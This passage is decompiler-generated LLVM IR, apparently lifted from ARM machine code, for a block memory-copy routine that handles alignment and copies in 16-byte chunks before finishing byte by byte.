  %v7_10420 = icmp slt i32 %v2_10420, 0
  store i1 %v7_10420, i1* %cpsr_n.global-to-local, align 1
  %v8_10420 = icmp eq i32 %v0_10420, 4
  store i1 %v8_10420, i1* %cpsr_z.global-to-local, align 1
  %v5_10424 = icmp slt i32 %v0_10420, 4
  br i1 %v5_10424, label %bb141, label %dec_label_pc_10428

dec_label_pc_10428:                               ; preds = %bb
  %v1_10428 = urem i32 %v1_10410, 4
  store i32 %v1_10428, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_10428 = icmp eq i32 %v1_10428, 0
  store i1 %v2_10428, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10428, label %dec_label_pc_10430, label %dec_label_pc_104dc

dec_label_pc_10430:                               ; preds = %dec_label_pc_10428
  %v1_10430 = urem i32 %v0_10410, 4
  store i32 %v1_10430, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_10430 = icmp eq i32 %v1_10430, 0
  store i1 %v2_10430, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_10410 to i2
  br i1 %v2_10430, label %dec_label_pc_10438, label %dec_label_pc_1050c

dec_label_pc_10438:                               ; preds = %dec_label_pc_10430, %dec_label_pc_10504
  %v0_1045094 = phi i32 [ %v1_10410, %dec_label_pc_10430 ], [ %v0_1062c77, %dec_label_pc_10504 ]
  %v0_1044c93 = phi i32 [ %v0_10410, %dec_label_pc_10430 ], [ %v0_10504, %dec_label_pc_10504 ]
  %v0_10438 = phi i32 [ %v2_10420, %dec_label_pc_10430 ], [ %v2_104fc, %dec_label_pc_10504 ]
  %v1_10438 = add i32 %v0_10438, -8
  store i32 %v1_10438, i32* %r2.global-to-local, align 4
  %v3_10438 = sub i32 7, %v0_10438
  %v4_10438 = and i32 %v3_10438, %v0_10438
  %v5_10438 = icmp slt i32 %v4_10438, 0
  store i1 %v5_10438, i1* %cpsr_v.global-to-local, align 1
  %v6_10438 = icmp slt i32 %v1_10438, 0
  store i1 %v6_10438, i1* %cpsr_n.global-to-local, align 1
  %v7_10438 = icmp eq i32 %v0_10438, 8
  store i1 %v7_10438, i1* %cpsr_z.global-to-local, align 1
  %v2_1043c = xor i1 %v6_10438, %v5_10438
  br i1 %v2_1043c, label %dec_label_pc_1048c, label %dec_label_pc_10440

dec_label_pc_10440:                               ; preds = %dec_label_pc_10438
  %v1_10440 = add i32 %v0_10438, -28
  store i32 %v1_10440, i32* %r2.global-to-local, align 4
  %v3_10440 = sub i32 27, %v0_10438
  %v4_10440 = and i32 %v3_10440, %v1_10438
  %v5_10440 = icmp slt i32 %v4_10440, 0
  store i1 %v5_10440, i1* %cpsr_v.global-to-local, align 1
  %v6_10440 = icmp slt i32 %v1_10440, 0
  store i1 %v6_10440, i1* %cpsr_n.global-to-local, align 1
  %v7_10440 = icmp eq i32 %v1_10438, 20
  store i1 %v7_10440, i1* %cpsr_z.global-to-local, align 1
  %v2_10444 = xor i1 %v6_10440, %v5_10440
  br i1 %v2_10444, label %dec_label_pc_10478, label %dec_label_pc_10448

dec_label_pc_10448:                               ; preds = %dec_label_pc_10440
  %v0_10448 = load i32, i32* @r4, align 4
  store i32 %v0_10448, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1044c

dec_label_pc_1044c:                               ; preds = %dec_label_pc_1044c.dec_label_pc_1044c_crit_edge, %dec_label_pc_10448
  %v0_10450 = phi i32 [ %v12_10458, %dec_label_pc_1044c.dec_label_pc_1044c_crit_edge ], [ %v0_1045094, %dec_label_pc_10448 ]
  %v0_1044c = phi i32 [ %v0_1044c.pre, %dec_label_pc_1044c.dec_label_pc_1044c_crit_edge ], [ %v0_1044c93, %dec_label_pc_10448 ]
  %v1_1044c = inttoptr i32 %v0_1044c to i32*
  %v2_1044c = load i32, i32* %v1_1044c, align 4
  %v3_1044c = add i32 %v0_1044c, 4
  %v4_1044c = inttoptr i32 %v3_1044c to i32*
  %v5_1044c = load i32, i32* %v4_1044c, align 4
  store i32 %v5_1044c, i32* %r4.global-to-local, align 4
  %v6_1044c = add i32 %v0_1044c, 8
  %v7_1044c = inttoptr i32 %v6_1044c to i32*
  %v8_1044c = load i32, i32* %v7_1044c, align 4
  store i32 %v8_1044c, i32* %ip.global-to-local, align 4
  %v9_1044c = add i32 %v0_1044c, 12
  %v10_1044c = inttoptr i32 %v9_1044c to i32*
  %v11_1044c = load i32, i32* %v10_1044c, align 4
  store i32 %v11_1044c, i32* %lr.global-to-local, align 4
  %v12_1044c = add i32 %v0_1044c, 16
  store i32 %v12_1044c, i32* %r1.global-to-local, align 4
  %v1_10450 = inttoptr i32 %v0_10450 to i32*
  store i32 %v2_1044c, i32* %v1_10450, align 4
  %v3_10450 = add i32 %v0_10450, 4
  %v4_10450 = inttoptr i32 %v3_10450 to i32*
  %v5_10450 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_10450, i32* %v4_10450, align 4
  %v6_10450 = add i32 %v0_10450, 8
  %v7_10450 = inttoptr i32 %v6_10450 to i32*
  %v8_10450 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_10450, i32* %v7_10450, align 4
  %v9_10450 = add i32 %v0_10450, 12
  %v10_10450 = inttoptr i32 %v9_10450 to i32*
  %v11_10450 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_10450, i32* %v10_10450, align 4
  %v12_10450 = add i32 %v0_10450, 16
  store i32 %v12_10450, i32* %r0.global-to-local, align 4
  %v0_10454 = load i32, i32* %r1.global-to-local, align 4
  %v1_10454 = inttoptr i32 %v0_10454 to i32*
  %v2_10454 = load i32, i32* %v1_10454, align 4
  store i32 %v2_10454, i32* @r3, align 4
  %v3_10454 = add i32 %v0_10454, 4
  %v4_10454 = inttoptr i32 %v3_10454 to i32*
  %v5_10454 = load i32, i32* %v4_10454, align 4
  store i32 %v5_10454, i32* %r4.global-to-local, align 4
  %v6_10454 = add i32 %v0_10454, 8
  %v7_10454 = inttoptr i32 %v6_10454 to i32*
  %v8_10454 = load i32, i32* %v7_10454, align 4
  store i32 %v8_10454, i32* @ip, align 4
  %v9_10454 = add i32 %v0_10454, 12
  %v10_10454 = inttoptr i32 %v9_10454 to i32*
  %v11_10454 = load i32, i32* %v10_10454, align 4
  store i32 %v11_10454, i32* %lr.global-to-local, align 4
  %v12_10454 = add i32 %v0_10454, 16
  store i32 %v12_10454, i32* @r1, align 4
  %v1_10458 = inttoptr i32 %v12_10450 to i32*
  store i32 %v2_10454, i32* %v1_10458, align 4
  %v3_10458 = add i32 %v0_10450, 20
  %v4_10458 = inttoptr i32 %v3_10458 to i32*
  %v5_10458 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_10458, i32* %v4_10458, align 4
  %v6_10458 = add i32 %v0_10450, 24
  %v7_10458 = inttoptr i32 %v6_10458 to i32*
  %v8_10458 = load i32, i32* @ip, align 4
  store i32 %v8_10458, i32* %v7_10458, align 4
  %v9_10458 = add i32 %v0_10450, 28
  %v10_10458 = inttoptr i32 %v9_10458 to i32*
  %v11_10458 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_10458, i32* %v10_10458, align 4
  %v12_10458 = add i32 %v0_10450, 32
  store i32 %v12_10458, i32* %r0.global-to-local, align 4
  %v0_1045c = load i32, i32* %r2.global-to-local, align 4
  %v1_1045c = add i32 %v0_1045c, -32
  store i32 %v1_1045c, i32* %r2.global-to-local, align 4
  %v3_1045c = sub i32 31, %v0_1045c
  %v4_1045c = and i32 %v3_1045c, %v0_1045c
  %v5_1045c = icmp slt i32 %v4_1045c, 0
  %v6_1045c = icmp slt i32 %v1_1045c, 0
  %v2_10460 = xor i1 %v6_1045c, %v5_1045c
  br i1 %v2_10460, label %dec_label_pc_10464, label %dec_label_pc_1044c.dec_label_pc_1044c_crit_edge

dec_label_pc_1044c.dec_label_pc_1044c_crit_edge:  ; preds = %dec_label_pc_1044c
  %v0_1044c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1044c

dec_label_pc_10464:                               ; preds = %dec_label_pc_1044c
  %v1_10464 = add i32 %v0_1045c, -16
  %v3_10464 = add i32 %v0_1045c, 2147483616
  %v4_10464 = and i32 %v1_10464, %v3_10464
  %v5_10464 = icmp slt i32 %v4_10464, 0
  store i1 %v5_10464, i1* %cpsr_v.global-to-local, align 1
  %v6_10464 = icmp slt i32 %v1_10464, 0
  store i1 %v6_10464, i1* %cpsr_n.global-to-local, align 1
  %v7_10464 = icmp eq i32 %v1_10464, 0
  store i1 %v7_10464, i1* %cpsr_z.global-to-local, align 1
  %v2_10468 = xor i1 %v6_10464, %v5_10464
  br i1 %v2_10468, label %bb138, label %bb137

bb137:                                            ; preds = %dec_label_pc_10464
  %v3_10468 = load i32, i32* @r1, align 4
  %v4_10468 = inttoptr i32 %v3_10468 to i32*
  %v5_10468 = load i32, i32* %v4_10468, align 4
  store i32 %v5_10468, i32* @r3, align 4
  %v6_10468 = add i32 %v3_10468, 4
  %v7_10468 = inttoptr i32 %v6_10468 to i32*
  %v8_10468 = load i32, i32* %v7_10468, align 4
  store i32 %v8_10468, i32* %r4.global-to-local, align 4
  %v9_10468 = add i32 %v3_10468, 8
  %v10_10468 = inttoptr i32 %v9_10468 to i32*
  %v11_10468 = load i32, i32* %v10_10468, align 4
  store i32 %v11_10468, i32* @ip, align 4
  %v12_10468 = add i32 %v3_10468, 12
  %v13_10468 = inttoptr i32 %v12_10468 to i32*
  %v14_10468 = load i32, i32* %v13_10468, align 4
  store i32 %v14_10468, i32* %lr.global-to-local, align 4
  %v15_10468 = add i32 %v3_10468, 16
  store i32 %v15_10468, i32* @r1, align 4
  %v4_1046c = inttoptr i32 %v12_10458 to i32*
  store i32 %v5_10468, i32* %v4_1046c, align 4
  %v6_1046c = add i32 %v0_10450, 36
  %v7_1046c = inttoptr i32 %v6_1046c to i32*
  %v8_1046c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_1046c, i32* %v7_1046c, align 4
  %v9_1046c = add i32 %v0_10450, 40
  %v10_1046c = inttoptr i32 %v9_1046c to i32*
  %v11_1046c = load i32, i32* @ip, align 4
  store i32 %v11_1046c, i32* %v10_1046c, align 4
  %v12_1046c = add i32 %v0_10450, 44
  %v13_1046c = inttoptr i32 %v12_1046c to i32*
  %v14_1046c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_1046c, i32* %v13_1046c, align 4
  %v15_1046c = add i32 %v0_10450, 48
  store i32 %v15_1046c, i32* %r0.global-to-local, align 4
  %v3_10470 = load i32, i32* %r2.global-to-local, align 4
  %v4_10470 = add i32 %v3_10470, -16
  store i32 %v4_10470, i32* %r2.global-to-local, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_10464, %bb137
  %v3_10480102111 = phi i32 [ %v15_1046c, %bb137 ], [ %v12_10458, %dec_label_pc_10464 ]
  %v0_10478.pre = phi i32 [ %v4_10470, %bb137 ], [ %v1_1045c, %dec_label_pc_10464 ]
  %v2_10474 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10474, i32* @r4, align 4
  br label %dec_label_pc_10478

dec_label_pc_10478:                               ; preds = %dec_label_pc_10440, %bb138
  %v3_10480101 = phi i32 [ %v0_1045094, %dec_label_pc_10440 ], [ %v3_10480102111, %bb138 ]
  %v0_10478 = phi i32 [ %v1_10440, %dec_label_pc_10440 ], [ %v0_10478.pre, %bb138 ]
  %v1_10478 = add i32 %v0_10478, 20
  store i32 %v1_10478, i32* %r2.global-to-local, align 4
  %v3_10478 = sub i32 0, %v0_10478
  %v4_10478 = and i32 %v1_10478, %v3_10478
  %v5_10478 = icmp slt i32 %v4_10478, 0
  store i1 %v5_10478, i1* %cpsr_v.global-to-local, align 1
  %v6_10478 = icmp slt i32 %v1_10478, 0
  store i1 %v6_10478, i1* %cpsr_n.global-to-local, align 1
  %v7_10478 = icmp eq i32 %v1_10478, 0
  store i1 %v7_10478, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1047c

dec_label_pc_1047c:                               ; preds = %.thread115, %dec_label_pc_10478
  %v0_1048c.pre158 = phi i32 [ %v0_1048c.pre, %.thread115 ], [ %v1_10478, %dec_label_pc_10478 ]
  %v3_10480 = phi i32 [ %v3_1048099116, %.thread115 ], [ %v3_10480101, %dec_label_pc_10478 ]
  %v1_10484 = phi i1 [ %v1_10488, %.thread115 ], [ %v5_10478, %dec_label_pc_10478 ]
  %v0_10484 = phi i1 [ %v0_10488, %.thread115 ], [ %v6_10478, %dec_label_pc_10478 ]
  %v2_1047c = xor i1 %v1_10484, %v0_10484
  br i1 %v2_1047c, label %.thread115, label %bb139

bb139:                                            ; preds = %dec_label_pc_1047c
  %v3_1047c = load i32, i32* @r1, align 4
  %v4_1047c = inttoptr i32 %v3_1047c to i32*
  %v5_1047c = load i32, i32* %v4_1047c, align 4
  store i32 %v5_1047c, i32* @r3, align 4
  %v6_1047c = add i32 %v3_1047c, 4
  %v7_1047c = inttoptr i32 %v6_1047c to i32*
  %v8_1047c = load i32, i32* %v7_1047c, align 4
  store i32 %v8_1047c, i32* @ip, align 4
  %v9_1047c = add i32 %v3_1047c, 8
  %v10_1047c = inttoptr i32 %v9_1047c to i32*
  %v11_1047c = load i32, i32* %v10_1047c, align 4
  store i32 %v11_1047c, i32* %lr.global-to-local, align 4
  %v12_1047c = add i32 %v3_1047c, 12
  store i32 %v12_1047c, i32* @r1, align 4
  %v4_10480 = inttoptr i32 %v3_10480 to i32*
  store i32 %v5_1047c, i32* %v4_10480, align 4
  %v6_10480 = add i32 %v3_10480, 4
  %v7_10480 = inttoptr i32 %v6_10480 to i32*
  %v8_10480 = load i32, i32* @ip, align 4
  store i32 %v8_10480, i32* %v7_10480, align 4
  %v9_10480 = add i32 %v3_10480, 8
  %v10_10480 = inttoptr i32 %v9_10480 to i32*
  %v11_10480 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_10480, i32* %v10_10480, align 4
  %v12_10480 = add i32 %v3_10480, 12
  store i32 %v12_10480, i32* %r0.global-to-local, align 4
  %v3_10484 = load i32, i32* %r2.global-to-local, align 4
  %v4_10484 = add i32 %v3_10484, -12
  store i32 %v4_10484, i32* %r2.global-to-local, align 4
  %v6_10484 = sub i32 11, %v3_10484
  %v7_10484 = and i32 %v6_10484, %v3_10484
  %v8_10484 = icmp slt i32 %v7_10484, 0
  store i1 %v8_10484, i1* %cpsr_v.global-to-local, align 1
  %v9_10484 = icmp slt i32 %v4_10484, 0
  store i1 %v9_10484, i1* %cpsr_n.global-to-local, align 1
  %v10_10484 = icmp eq i32 %v3_10484, 12
  store i1 %v10_10484, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_1047c, %bb139
  %v0_1048c.pre = phi i32 [ %v4_10484, %bb139 ], [ %v0_1048c.pre158, %dec_label_pc_1047c ]
  %v3_1048099116 = phi i32 [ %v12_10480, %bb139 ], [ %v3_10480, %dec_label_pc_1047c ]
  %v1_10488 = phi i1 [ %v8_10484, %bb139 ], [ %v1_10484, %dec_label_pc_1047c ]
  %v0_10488 = phi i1 [ %v9_10484, %bb139 ], [ %v0_10484, %dec_label_pc_1047c ]
  %v2_10488 = xor i1 %v1_10488, %v0_10488
  br i1 %v2_10488, label %dec_label_pc_1048c, label %dec_label_pc_1047c

dec_label_pc_1048c:                               ; preds = %.thread115, %dec_label_pc_10438
  %v4_1049c = phi i32 [ %v0_1045094, %dec_label_pc_10438 ], [ %v3_1048099116, %.thread115 ]
  %v0_1048c = phi i32 [ %v1_10438, %dec_label_pc_10438 ], [ %v0_1048c.pre, %.thread115 ]
  %v1_1048c = add i32 %v0_1048c, 8
  store i32 %v1_1048c, i32* %r2.global-to-local, align 4
  %v3_1048c = sub i32 0, %v0_1048c
  %v4_1048c = and i32 %v1_1048c, %v3_1048c
  %v5_1048c = icmp slt i32 %v4_1048c, 0
  store i1 %v5_1048c, i1* %cpsr_v.global-to-local, align 1
  %v6_1048c = icmp slt i32 %v1_1048c, 0
  store i1 %v6_1048c, i1* %cpsr_n.global-to-local, align 1
  %v7_1048c = icmp eq i32 %v1_1048c, 0
  store i1 %v7_1048c, i1* %cpsr_z.global-to-local, align 1
  %v2_10490 = xor i1 %v6_1048c, %v5_1048c
  br i1 %v2_10490, label %bb141, label %dec_label_pc_10494

dec_label_pc_10494:                               ; preds = %dec_label_pc_1048c
  %v1_10494 = add i32 %v0_1048c, 4
  store i32 %v1_10494, i32* %r2.global-to-local, align 4
  %v3_10494 = sub i32 -5, %v0_1048c
  %v4_10494 = and i32 %v3_10494, %v1_1048c
  %v5_10494 = icmp slt i32 %v4_10494, 0
  store i1 %v5_10494, i1* %cpsr_v.global-to-local, align 1
  %v6_10494 = icmp slt i32 %v1_10494, 0
  store i1 %v6_10494, i1* %cpsr_n.global-to-local, align 1
  %v7_10494 = icmp eq i32 %v1_1048c, 4
  store i1 %v7_10494, i1* %cpsr_z.global-to-local, align 1
  %v2_10498 = xor i1 %v6_10494, %v5_10494
  %v3_10498 = load i32, i32* @r1, align 4
  %v4_10498 = inttoptr i32 %v3_10498 to i32*
  %v5_10498 = load i32, i32* %v4_10498, align 4
  store i32 %v5_10498, i32* @r3, align 4
  %v7_10498 = add i32 %v3_10498, 4
  br i1 %v2_10498, label %.thread122, label %bb140

.thread122:                                       ; preds = %dec_label_pc_10494
  store i32 %v7_10498, i32* @r1, align 4
  %v5_1049c = inttoptr i32 %v4_1049c to i32*
  store i32 %v5_10498, i32* %v5_1049c, align 4
  %v6_1049c = load i32, i32* %r0.global-to-local, align 4
  %v7_1049c = add i32 %v6_1049c, 4
  store i32 %v7_1049c, i32* %r0.global-to-local, align 4
  %v0_104ac.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb141

bb140:                                            ; preds = %dec_label_pc_10494
  %v7_104a0 = inttoptr i32 %v7_10498 to i32*
  %v8_104a0 = load i32, i32* %v7_104a0, align 4
  store i32 %v8_104a0, i32* @ip, align 4
  %v9_104a0 = add i32 %v3_10498, 8
  store i32 %v9_104a0, i32* @r1, align 4
  %v4_104a4 = inttoptr i32 %v4_1049c to i32*
  store i32 %v5_10498, i32* %v4_104a4, align 4
  %v6_104a4 = add i32 %v4_1049c, 4
  %v7_104a4 = inttoptr i32 %v6_104a4 to i32*
  %v8_104a4 = load i32, i32* @ip, align 4
  store i32 %v8_104a4, i32* %v7_104a4, align 4
  %v9_104a4 = add i32 %v4_1049c, 8
  store i32 %v9_104a4, i32* %r0.global-to-local, align 4
  %v3_104a8 = load i32, i32* %r2.global-to-local, align 4
  %v4_104a8 = add i32 %v3_104a8, -4
  store i32 %v4_104a8, i32* %r2.global-to-local, align 4
  br label %bb141

bb141:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_1048c, %bb, %dec_label_pc_1065c, %dec_label_pc_105f0, %dec_label_pc_10584, %bb140
  %v0_104ac = phi i32 [ %v0_104ac.pre, %.thread122 ], [ %v2_104fc, %.thread128 ], [ %v1_1048c, %dec_label_pc_1048c ], [ %v2_10420, %bb ], [ %v0_104ac61, %dec_label_pc_1065c ], [ %v0_104ac60, %dec_label_pc_105f0 ], [ %v0_104ac59, %dec_label_pc_10584 ], [ %v4_104a8, %bb140 ]
  %v1_104ac = add i32 %v0_104ac, 4
  store i32 %v1_104ac, i32* %r2.global-to-local, align 4
  %v3_104ac = sub i32 0, %v0_104ac
  %v4_104ac = and i32 %v1_104ac, %v3_104ac
  %v5_104ac = icmp slt i32 %v4_104ac, 0
  store i1 %v5_104ac, i1* %cpsr_v.global-to-local, align 1
  %v6_104ac = icmp slt i32 %v1_104ac, 0
  store i1 %v6_104ac, i1* %cpsr_n.global-to-local, align 1
  %v7_104ac = icmp eq i32 %v1_104ac, 0
  store i1 %v7_104ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_104ac, label %bb142, label %bb141.bb143_crit_edge

bb141.bb143_crit_edge:                            ; preds = %bb141
  %v0_104b4.pre = load i32, i32* @r3, align 4
  br label %bb143

bb142:                                            ; preds = %bb141
  %v3_104b0 = load i8*, i8** %stack_var_-8, align 4
  %v4_104b0 = ptrtoint i8* %v3_104b0 to i32
  store i32 %v4_104b0, i32* %r0.global-to-local, align 4
  br label %bb143

bb143:                                            ; preds = %bb141.bb143_crit_edge, %bb142
  %v0_104b4 = phi i32 [ %v0_104b4.pre, %bb141.bb143_crit_edge ], [ %v8_1041c, %bb142 ]
  call void @__pseudo_cond_branch(i1 %v7_104ac, i32 %v0_104b4)
  %v0_104b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_104b8 = add i32 %v0_104b8, -2
  %v3_104b8 = sub i32 1, %v0_104b8
  %v4_104b8 = and i32 %v3_104b8, %v0_104b8
  %v5_104b8 = icmp slt i32 %v4_104b8, 0
  store i1 %v5_104b8, i1* %cpsr_v.global-to-local, align 1
  %v6_104b8 = icmp slt i32 %v1_104b8, 0
  store i1 %v6_104b8, i1* %cpsr_n.global-to-local, align 1
  %v7_104b8 = icmp eq i32 %v0_104b8, 2
  store i1 %v7_104b8, i1* %cpsr_z.global-to-local, align 1
  %v0_104bc = load i32, i32* @r1, align 4
  %v1_104bc = inttoptr i32 %v0_104bc to i8*
  %v2_104bc = load i8, i8* %v1_104bc, align 1
  %v5_104bc = add i32 %v0_104bc, 1
  store i32 %v5_104bc, i32* %r1.global-to-local, align 4
  %v2_104c0 = load i32, i32* %r0.global-to-local, align 4
  %v3_104c0 = inttoptr i32 %v2_104c0 to i8*
  store i8 %v2_104bc, i8* %v3_104c0, align 1
  %v4_104c0 = load i32, i32* %r0.global-to-local, align 4
  %v5_104c0 = add i32 %v4_104c0, 1
  store i32 %v5_104c0, i32* %r0.global-to-local, align 4
  %v0_104c4 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_104c4 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_104c4 = xor i1 %v0_104c4, %v1_104c4
  br i1 %v2_104c4, label %.thread125, label %bb144

bb144:                                            ; preds = %bb143
  %v3_104c4 = load i32, i32* %r1.global-to-local, align 4
  %v4_104c4 = inttoptr i32 %v3_104c4 to i8*
  %v5_104c4 = load i8, i8* %v4_104c4, align 1
  %v8_104c4 = add i32 %v3_104c4, 1
  store i32 %v8_104c4, i32* %r1.global-to-local, align 4
  %v6_104c8 = inttoptr i32 %v5_104c0 to i8*
  store i8 %v5_104c4, i8* %v6_104c8, align 1
  %v7_104c8 = load i32, i32* %r0.global-to-local, align 4
  %v8_104c8 = add i32 %v7_104c8, 1
  store i32 %v8_104c8, i32* %r0.global-to-local, align 4
  %v1_104cc.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_104cc.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb143, %bb144
  %v7_104d0 = phi i32 [ %v8_104c8, %bb144 ], [ %v5_104c0, %bb143 ]
  %v2_104d0 = phi i1 [ %v2_104cc.pre, %bb144 ], [ %v1_104c4, %bb143 ]
  %v1_104d0 = phi i1 [ %v1_104cc.pre, %bb144 ], [ %v0_104c4, %bb143 ]
  %v0_104cc = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_104cc = xor i1 %v2_104d0, %v1_104d0
  %v4_104cc = or i1 %v0_104cc, %v3_104cc
  br i1 %v4_104cc, label %.thread126, label %bb145

bb145:                                            ; preds = %.thread125
  %v5_104cc = load i32, i32* %r1.global-to-local, align 4
  %v6_104cc = inttoptr i32 %v5_104cc to i8*
  %v7_104cc = load i8, i8* %v6_104cc, align 1
  %v10_104cc = add i32 %v5_104cc, 1
  store i32 %v10_104cc, i32* %r1.global-to-local, align 4
  %v8_104d0 = inttoptr i32 %v7_104d0 to i8*
  store i8 %v7_104cc, i8* %v8_104d0, align 1
  %v9_104d0 = load i32, i32* %r0.global-to-local, align 4
  %v10_104d0 = add i32 %v9_104d0, 1
  store i32 %v10_104d0, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb145
  %v2_104d4 = load i8*, i8** %stack_var_-8, align 4
  %v3_104d4 = ptrtoint i8* %v2_104d4 to i32
  store i32 %v3_104d4, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v8_1041c)
  %v0_104dc.pre = load i32, i32* @ip, align 4
  %v0_104e4.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_104e8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_104dc

dec_label_pc_104dc:                               ; preds = %dec_label_pc_10428, %.thread126
  %v2_104e8 = phi i32 [ %v1_10410, %dec_label_pc_10428 ], [ %v2_104e8.pre, %.thread126 ]
  %v0_104e4 = phi i32 [ %v0_10410, %dec_label_pc_10428 ], [ %v0_104e4.pre, %.thread126 ]
  %v0_104dc = phi i32 [ %v1_10428, %dec_label_pc_10428 ], [ %v0_104dc.pre, %.thread126 ]
  %v1_104dc = sub i32 4, %v0_104dc
  store i32 %v1_104dc, i32* @ip, align 4
  %v1_104e0 = add i32 %v1_104dc, -2
  %v3_104e0 = sub i32 1, %v1_104dc
  %v4_104e0 = and i32 %v3_104e0, %v1_104dc
  %v5_104e0 = icmp slt i32 %v4_104e0, 0
  store i1 %v5_104e0, i1* %cpsr_v.global-to-local, align 1
  %v6_104e0 = icmp slt i32 %v1_104e0, 0
  store i1 %v6_104e0, i1* %cpsr_n.global-to-local, align 1
  %v7_104e0 = icmp eq i32 %v1_104dc, 2
  store i1 %v7_104e0, i1* %cpsr_z.global-to-local, align 1
  %v1_104e4 = inttoptr i32 %v0_104e4 to i8*
  %v2_104e4 = load i8, i8* %v1_104e4, align 1
  %v3_104e4 = zext i8 %v2_104e4 to i32
  store i32 %v3_104e4, i32* @r3, align 4
  %v5_104e4 = add i32 %v0_104e4, 1
  store i32 %v5_104e4, i32* @r1, align 4
  %v3_104e8 = inttoptr i32 %v2_104e8 to i8*
  store i8 %v2_104e4, i8* %v3_104e8, align 1
  %v4_104e8 = load i32, i32* %r0.global-to-local, align 4
  %v5_104e8 = add i32 %v4_104e8, 1
  store i32 %v5_104e8, i32* %r0.global-to-local, align 4
  %v0_104ec = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_104ec = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_104ec = xor i1 %v0_104ec, %v1_104ec
  br i1 %v2_104ec, label %.thread127, label %bb146

bb146:                                            ; preds = %dec_label_pc_104dc
  %v3_104ec = load i32, i32* @r1, align 4
  %v4_104ec = inttoptr i32 %v3_104ec to i8*
  %v5_104ec = load i8, i8* %v4_104ec, align 1
  %v6_104ec = zext i8 %v5_104ec to i32
  store i32 %v6_104ec, i32* @r3, align 4
  %v8_104ec = add i32 %v3_104ec, 1
  store i32 %v8_104ec, i32* @r1, align 4
  %v6_104f0 = inttoptr i32 %v5_104e8 to i8*
  store i8 %v5_104ec, i8* %v6_104f0, align 1
  %v7_104f0 = load i32, i32* %r0.global-to-local, align 4
  %v8_104f0 = add i32 %v7_104f0, 1
  store i32 %v8_104f0, i32* %r0.global-to-local, align 4
  %v1_104f4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_104f4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_104dc, %bb146
  %v7_104f8 = phi i32 [ %v8_104f0, %bb146 ], [ %v5_104e8, %dec_label_pc_104dc ]
  %v2_104f8 = phi i1 [ %v2_104f4.pre, %bb146 ], [ %v1_104ec, %dec_label_pc_104dc ]
  %v1_104f8 = phi i1 [ %v1_104f4.pre, %bb146 ], [ %v0_104ec, %dec_label_pc_104dc ]
  %v0_104f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_104f4 = xor i1 %v2_104f8, %v1_104f8
  %v4_104f4 = or i1 %v0_104f4, %v3_104f4
  br i1 %v4_104f4, label %.thread128, label %bb147

bb147:                                            ; preds = %.thread127
  %v5_104f4 = load i32, i32* @r1, align 4
  %v6_104f4 = inttoptr i32 %v5_104f4 to i8*
  %v7_104f4 = load i8, i8* %v6_104f4, align 1
  %v8_104f4 = zext i8 %v7_104f4 to i32
  store i32 %v8_104f4, i32* @r3, align 4
  %v10_104f4 = add i32 %v5_104f4, 1
  store i32 %v10_104f4, i32* @r1, align 4
  %v8_104f8 = inttoptr i32 %v7_104f8 to i8*
  store i8 %v7_104f4, i8* %v8_104f8, align 1
  %v9_104f8 = load i32, i32* %r0.global-to-local, align 4
  %v10_104f8 = add i32 %v9_104f8, 1
  store i32 %v10_104f8, i32* %r0.global-to-local, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb147
  %v0_1062c77 = phi i32 [ %v10_104f8, %bb147 ], [ %v7_104f8, %.thread127 ]
  %v0_104fc = load i32, i32* %r2.global-to-local, align 4
  %v1_104fc = load i32, i32* @ip, align 4
  %v2_104fc = sub i32 %v0_104fc, %v1_104fc
  store i32 %v2_104fc, i32* %r2.global-to-local, align 4
  %v4_104fc = xor i32 %v1_104fc, %v0_104fc
  %v5_104fc = xor i32 %v2_104fc, %v0_104fc
  %v6_104fc = and i32 %v5_104fc, %v4_104fc
  %v7_104fc = icmp slt i32 %v6_104fc, 0
  store i1 %v7_104fc, i1* %cpsr_v.global-to-local, align 1
  %v8_104fc = icmp slt i32 %v2_104fc, 0
  store i1 %v8_104fc, i1* %cpsr_n.global-to-local, align 1
  %v9_104fc = icmp eq i32 %v0_104fc, %v1_104fc
  store i1 %v9_104fc, i1* %cpsr_z.global-to-local, align 1
  %v2_10500 = xor i1 %v8_104fc, %v7_104fc
  br i1 %v2_10500, label %bb141, label %dec_label_pc_10504

dec_label_pc_10504:                               ; preds = %.thread128
  %v0_10504 = load i32, i32* @r1, align 4
